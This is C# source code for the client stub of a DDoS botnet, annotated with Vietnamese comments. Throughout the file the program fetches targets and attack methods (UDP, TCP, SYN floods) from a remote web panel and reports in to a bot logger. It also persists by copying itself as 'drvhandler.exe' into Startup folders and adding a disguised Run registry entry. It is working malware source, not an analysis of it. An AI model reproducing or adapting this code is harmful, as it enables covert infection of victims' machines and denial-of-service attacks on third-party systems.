using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Stub
{
	public partial class a : Form
	{
		public string webRoot;

		public int threads;

		public DoSAttack attacco = new DoSAttack();

		public string ip;

		public int port;

		public string method;

		public a()
		{
			InitializeComponent();
		}
		public int toInt(string stringa)
		{
			int result;
			try
			{
				result = Convert.ToInt32(stringa);
			}
			catch
			{
				result = 0;
			}
			return result;
		}
		public void loadStuff()
		{
			try
			{
				StreamReader streamReader = new StreamReader(Application.ExecutablePath);
				string text = streamReader.ReadToEnd();
				text = text.Substring(text.IndexOf("-START-"), text.IndexOf("-END-") - text.IndexOf("-START-"));
				string text2 = text.Replace("-START-", "");
				webRoot = text2.Split(new char[]
				{
					'*'
				})[0];
				threads = toInt(text2.Split(new char[]
				{
					'*'
				})[1]);
			}
			catch
			{
			}
		}
		public void updateTarget()
		{
			string text = fileFromWebRoot("target");
			if (text.Contains("|"))
			{
				string[] array = text.Split(new char[]
				{
					'|'
				});
				ip = array[0];
				port = toInt(array[1]);
				method = array[2];
			}
			else // nếu không tìm thấy file target thì lấy 3 file bên dưới
			{
				method = fileFromWebRoot("target.method"); 
				ip = fileFromWebRoot("target.ip");
				port = toInt(fileFromWebRoot("target.port"));
			}
			if (ip != "STOP") // Nếu giá trị ip khác STOP thì kiểm tra ip có là URL và kiểm tra method đang dùng
			{
				if (attacco.isUrl(ip) && (method == "UDP" || method == "TCP" || method == "SYN" || method == "MCBOTALPHA"))
				{
					ip = attacco.resolveUrl(ip);
				}
                attacco.ip = ip; // gán ip cho thuộc tính ip của biến attacco thuộc lớp DoSAttack
                attacco.port = port; // gán port cho thuộc tính port của biến attacco thuộc lớp DoSAttack
                attacco.method = method; // gán method cho thuộc tính method của biến attacco thuộc lớp DoSAttack
			}
			else
			{
                attacco.method = "STOP"; // Ngược lại gán "STOP" cho thuộc tính method của biến attacco thuộc lớp DoSAttack
			}
			fileFromWebRoot("botlogger.php");
		}
		public void updateLists()
		{
			try
			{
				attacco.proxyList = fileFromWebRoot("proxy").Split(new char[]
				{
					'\n'
				});
			}
			catch
			{
			}
			try
			{
				attacco.blogList = fileFromWebRoot("blog").Split(new char[]
				{
					'\n'
				});
			}
			catch
			{
			}
		}
		public void setOnStartup()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			bool flag = false;
			try
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\drvhandler.exe");
				flag = true;
			}
			catch
			{
			}
			try
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, "C:\\ProgramData\\Microsoft\\Windows\\Menu Start\\Programmi\\Esecuzione Automatica\\drvhandler.exe");
				flag = true;
			}
			catch
			{
			}
			if (!flag)
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "drvhandler.exe"));
					try
					{
						registryKey.SetValue("sysDrvHandler", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "drvhandler.exe"));
					}
					catch
					{
						try
						{
							registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\LocalMachine\\Run", true);
							registryKey.SetValue("sysDrvHandler", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "drvhandler.exe"));
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}
		public string onlineFileContent(string link)
		{
			string result;
			try
			{
				WebClient webClient = new WebClient(); // tạo 1 biến webClient
				Stream stream = webClient.OpenRead(link); // tạo 1 luồng stream để đọc đường dẫn đưa vào
				StreamReader streamReader = new StreamReader(stream);
				string text = streamReader.ReadToEnd(); // đọc đến hết file
				if (text == null)
				{
					result = "";
				}
				else
				{
					result = text;
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}

		public string fileFromWebRoot(string file)
		{
			return onlineFileContent(webRoot + file); // Vd: http://192.168.1.112/WebPanel/target
		}
		private void targetUpdater()
		{
			for (; ; )
			{
				Thread.Sleep(30000);
				updateTarget();
			}
		}
		private void listsUpdater()
		{
			for (; ; )
			{
				Thread.Sleep(300000);
				updateLists();
			}
		}
		private void main()
		{
			loadStuff();
			setOnStartup();
			updateLists();
			updateTarget();
            // Truyền các giá trị đã đọc được cho phương thức attack của biến attacco thuộc lớp DoSAttack
			attacco.attack(ip, port, method, threads);
            Thread thread = new Thread(new ThreadStart(targetUpdater)); // tạo thread cho hàm targetUpdater
            Thread thread2 = new Thread(new ThreadStart(listsUpdater)); // tạo thread cho hàm listsUpdater
			thread.Start(); 
			thread2.Start(); 
		}
		private void a_Load(object sender, EventArgs e)
		{
			Thread thread = new Thread(new ThreadStart(main));
			thread.Start();
		}
	}
}
